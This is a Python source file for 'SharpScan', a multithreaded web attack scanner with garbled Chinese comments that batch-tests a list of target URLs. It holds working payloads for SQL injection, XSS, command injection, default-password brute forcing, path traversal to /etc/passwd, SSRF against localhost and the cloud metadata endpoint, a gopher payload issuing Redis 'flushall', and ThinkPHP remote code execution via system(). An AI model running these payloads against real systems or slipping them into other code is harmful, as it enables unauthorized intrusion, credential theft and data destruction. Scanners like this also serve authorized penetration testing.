import requests
import sys
import argparse
import time
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.table import Table
from rich.progress import Progress,SpinnerColumn,TextColumn

#ç¦æ­¢è¯·æ±‚è­¦å‘Š
requests.packages.urllib3.disable_warnings()

#åˆå§‹åŒ–richæ§åˆ¶å°
console = Console()

class SharpScan:
    def __init__(self):
        self.vuln_results = []
        self.session = requests.Session()
        self.session.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

    # 1. SQLå¸ƒå°”ç›²æ³¨
    def poc_sql_bool_blind(self, url):
        payloads = [
            "' AND 1=1 -- ",
            "' AND 1=2 -- ",
            "\" AND 1=1 -- ",
            "\" AND 1=2 -- "
        ]
        try:
            origin_resp = self.session.get(url, timeout=5, verify=False)
            origin_len = len(origin_resp.text)
            for payload in payloads:
                test_url = url + payload if "?" in url else url + "?" + payload
                resp = self.session.get(test_url, timeout=5, verify=False)
                if len(resp.text) != origin_len:
                    return f"[SQLå¸ƒå°”ç›²æ³¨] {test_url[:60]}... â†’ å¸ƒå°”ç›²æ³¨å­˜åœ¨"
        except:
            pass
        return None

    # 2. SQLæ—¶é—´ç›²æ³¨
    def poc_sql_time_blind(self, url):
        payloads = [
            "' AND SLEEP(3) -- ",
            "\" AND SLEEP(3) -- ",
            "; WAITFOR DELAY '00:00:03' -- "
        ]
        try:
            for payload in payloads:
                test_url = url + payload if "?" in url else url + "?" + payload
                start = time.time()
                self.session.get(test_url, timeout=10, verify=False)
                end = time.time()
                if end - start >= 3:
                    return f"[SQLæ—¶é—´ç›²æ³¨] {test_url[:60]}... â†’ æ—¶é—´ç›²æ³¨å­˜åœ¨"
        except:
            pass
        return None

    # 3. åå°„å‹XSS
    def poc_xss_reflected(self, url):
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "%3Cscript%3Ealert(1)%3C/script%3E"
        ]
        try:
            for payload in payloads:
                test_url = url + payload if "?" in url else url + "?" + payload
                resp = self.session.get(test_url, timeout=5, verify=False)
                if payload in resp.text or payload.replace("<", "&lt;").replace(">", "&gt;") in resp.text:
                    return f"[åå°„å‹XSS] {test_url[:60]}... â†’ XSSæ¼æ´å­˜åœ¨"
        except:
            pass
        return None

    # 4. å‘½ä»¤æ³¨å…¥
    def poc_cmd_injection(self, url):
        payloads = [
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "| id",
            "; id"
        ]
        try:
            for payload in payloads:
                test_url = url + payload if "?" in url else url + "?" + payload
                resp = self.session.get(test_url, timeout=5, verify=False)
                if "root" in resp.text or "www-data" in resp.text or "administrator" in resp.text:
                    return f"[å‘½ä»¤æ³¨å…¥] {test_url[:60]}... â†’ {resp.text.strip()[:20]}"
        except:
            pass
        return None

    # 5. å¼±å£ä»¤çˆ†ç ´
    def poc_weak_password(self, url):
        test_accounts = [
            ("admin", "admin"),
            ("admin", "123456"),
            ("root", "root"),
            ("test", "test")
        ]
        try:
            if "login" in url.lower() or "signin" in url.lower():
                for user, pwd in test_accounts:
                    resp = self.session.post(url, data={"username": user, "password": pwd}, timeout=5, verify=False)
                    if "success" in resp.text.lower() or "welcome" in resp.text.lower() or "dashboard" in resp.text.lower():
                        return f"[å¼±å£ä»¤] {url[:60]}... â†’ è´¦å·ï¼š{user} å¯†ç ï¼š{pwd}"
        except:
            pass
        return None

    # 6. ä»»æ„æ–‡ä»¶è¯»å–
    def poc_lfi(self, url):
        payloads = [
            "../../../../../../etc/passwd",
            "../../../../../../windows/win.ini",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        for payload in payloads:
            try:
                test_url = url.replace("file=", "").replace("page=", "").split("?")[0]
                if "?" in url:
                    test_url = url.split("?")[0] + f"?file={payload}"
                else:
                    test_url = url + payload if not url.endswith("/") else url[:-1] + payload

                resp = requests.get(test_url, timeout=6, verify=False, allow_redirects=False)
                text = resp.text.lower()
                if "root:" in text and "bash" in text or "extensions" in text and "mci" in text or "pd89" in text:
                    return f"[ä»»æ„æ–‡ä»¶è¯»å–] {test_url[:60]}... â†’ è¯»å–åˆ°ç³»ç»Ÿæ–‡ä»¶"
            except:
                continue
        return None

    # 7. SSRF
    def poc_ssrf(self, url):
        payloads = [
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:6379",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"
        ]
        for payload in payloads:
            try:
                test_url = url.replace("url=", "").replace("u=", "").split("?")[0]
                test_url = test_url + f"?url={payload}" if "?" in url else test_url + payload

                resp = requests.get(test_url, timeout=7, verify=False)
                text = resp.text.lower()
                if any(kw in text for kw in ["ssh", "mysql", "redis", "ami-id", "root:", "uid="]):
                    return f"[SSRF] {test_url[:60]}... â†’ è®¿é—®åˆ°å†…ç½‘æœåŠ¡"
            except:
                continue
        return None

    # 8. ThinkPHP RCE
    def poc_thinkphp_rce(self, url):
        payloads = [
            "?s=captcha&_method=__construct&method=GET&filter[]=system&server[REQUEST_METHOD]=whoami",
            "?s=captcha&_method=__construct&method=GET&filter[]=system&get[]=id",
            "?s=home/index/construct&name=1&_method=__construct&method=POST&filter[]=system&server[REQUEST_METHOD]=whoami"
        ]
        for payload in payloads:
            try:
                test_url = url.rstrip("/") + "/" + payload.lstrip("?")
                resp = requests.get(test_url, timeout=6, verify=False)
                if resp.status_code == 200 and len(resp.text) < 100 and (
                        "root" in resp.text or "administrator" in resp.text or "www-data" in resp.text):
                    cmd_result = resp.text.strip().replace("\n", "")
                    return f"[ThinkPHP RCE] {test_url[:60]}... â†’ {cmd_result}"
            except:
                continue
        return None

    # æ‰«æå·¥ä½œçº¿ç¨‹ï¼ˆå¸¦è¿›åº¦æç¤ºï¼‰
    def scan_worker(self, target, progress, task_id):
        progress.update(task_id, advance=1)
        console.print(f"[blue]ğŸ” æ­£åœ¨æ‰«æï¼š[/blue] {target}")
        # è°ƒç”¨æ‰€æœ‰POC
        results = [
            self.poc_sql_bool_blind(target),
            self.poc_sql_time_blind(target),
            self.poc_xss_reflected(target),
            self.poc_cmd_injection(target),
            self.poc_weak_password(target),
            self.poc_lfi(target),
            self.poc_ssrf(target),
            self.poc_thinkphp_rce(target)
        ]
        for res in results:
            if res:
                self.vuln_results.append(res)
                console.print(f"[red bold]âœ… å‘ç°æ¼æ´ï¼š[/red bold] {res}")

    # ç”ŸæˆHTMLæŠ¥å‘Š
    def generate_html_report(self, report_name="sharpscan_report.html"):
        html_template = f"""
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>SharpScan æ¼æ´æ‰«ææŠ¥å‘Š</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ text-align: center; padding: 20px; background: #2c3e50; color: white; border-radius: 8px; }}
        .vuln-table {{ width: 100%; border-collapse: collapse; margin: 20px 0; background: white; border-radius: 8px; overflow: hidden; }}
        .vuln-table th {{ background: #3498db; color: white; padding: 12px; text-align: left; }}
        .vuln-table td {{ padding: 12px; border-bottom: 1px solid #ddd; }}
        .vuln-table tr:hover {{ background: #f9f9f9; }}
        .stats {{ text-align: center; margin: 20px 0; font-size: 18px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>SharpScan æ¼æ´æ‰«ææŠ¥å‘Š</h1>
        <p>æ‰«ææ—¶é—´ï¼š{time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>å‘ç°æ¼æ´æ€»æ•°ï¼š{len(self.vuln_results)}</p>
    </div>
    <div class="stats">æ‰«æç»“æœæ±‡æ€»</div>
    <table class="vuln-table">
        <tr>
            <th>åºå·</th>
            <th>æ¼æ´ä¿¡æ¯</th>
        </tr>
        {"".join([f"<tr><td>{i+1}</td><td>{vuln}</td></tr>" for i, vuln in enumerate(self.vuln_results)])}
    </table>
</body>
</html>
        """
        with open(report_name, "w", encoding="utf-8") as f:
            f.write(html_template)
        console.print(f"[green]ğŸ“„ HTMLæŠ¥å‘Šå·²ç”Ÿæˆï¼š[/green] {report_name}")

    # æ‰¹é‡æ‰«æï¼ˆå¸¦argparseå‚æ•°ï¼‰
    def batch_scan(self, targets_file, threads=5, report_name="sharpscan_report.html"):
        try:
            # è¯»å–ç›®æ ‡æ–‡ä»¶
            with open(targets_file, "r", encoding="utf-8") as f:
                targets = [line.strip() for line in f if line.strip()]
            if not targets:
                console.print("[yellow]âš ï¸  ç›®æ ‡æ–‡ä»¶ä¸ºç©ºï¼[/yellow]")
                return

            # å¸¦è¿›åº¦æ¡çš„æ‰«æ
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                "{task.completed}/{task.total}",
                transient=True,
            ) as progress:
                task_id = progress.add_task("[green]æ­£åœ¨æ‰¹é‡æ‰«æç›®æ ‡...", total=len(targets))
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    for target in targets:
                        executor.submit(self.scan_worker, target, progress, task_id)

            # è¾“å‡ºæ±‡æ€»ï¼ˆrichè¡¨æ ¼ï¼‰
            console.print("\n" + "="*80)
            console.print("[bold magenta]æ‰«æå®Œæˆï¼æ¼æ´æ±‡æ€»[/bold magenta]")
            console.print("="*80)
            if self.vuln_results:
                table = Table(title="SharpScan æ¼æ´åˆ—è¡¨")
                table.add_column("åºå·", style="cyan")
                table.add_column("æ¼æ´è¯¦æƒ…", style="white")
                for idx, vuln in enumerate(self.vuln_results, 1):
                    table.add_row(str(idx), vuln)
                console.print(table)
            else:
                console.print("[yellow]âš ï¸  æœªå‘ç°ä»»ä½•æ¼æ´[/yellow]")

            # ç”ŸæˆHTMLæŠ¥å‘Š
            self.generate_html_report(report_name)

        except FileNotFoundError:
            console.print(f"[red]âŒ é”™è¯¯ï¼šæ‰¾ä¸åˆ°æ–‡ä»¶ {targets_file}[/red]")
        except Exception as e:
            console.print(f"[red]âŒ æ‰«æå‡ºé”™ï¼š{str(e)}[/red]")

if __name__ == "__main__":
    # å‘½ä»¤è¡Œå‚æ•°è§£æ
    parser = argparse.ArgumentParser(
        prog="SharpScan",
        description="ğŸ”¥ é«˜æ€§èƒ½Webæ¼æ´æ‰«æå·¥å…· | æ”¯æŒ8ç±»æ ¸å¿ƒæ¼æ´POC",
        epilog="ä½¿ç”¨ç¤ºä¾‹ï¼špython AAArequest5.py -f targets.txt -t 10 -r my_report.html"
    )
    parser.add_argument("-f", "--file", required=True, help="ç›®æ ‡æ–‡ä»¶è·¯å¾„ï¼ˆæ¯è¡Œä¸€ä¸ªURLï¼‰")
    parser.add_argument("-t", "--threads", type=int, default=5, help="æ‰«æçº¿ç¨‹æ•°ï¼ˆé»˜è®¤5ï¼‰")
    parser.add_argument("-r", "--report", default="sharpscan_report.html", help="HTMLæŠ¥å‘Šæ–‡ä»¶åï¼ˆé»˜è®¤sharpscan_report.htmlï¼‰")
    args = parser.parse_args()

    # åˆå§‹åŒ–å¹¶æ‰«æ
    scanner = SharpScan()
    scanner.batch_scan(args.file, args.threads, args.report)




































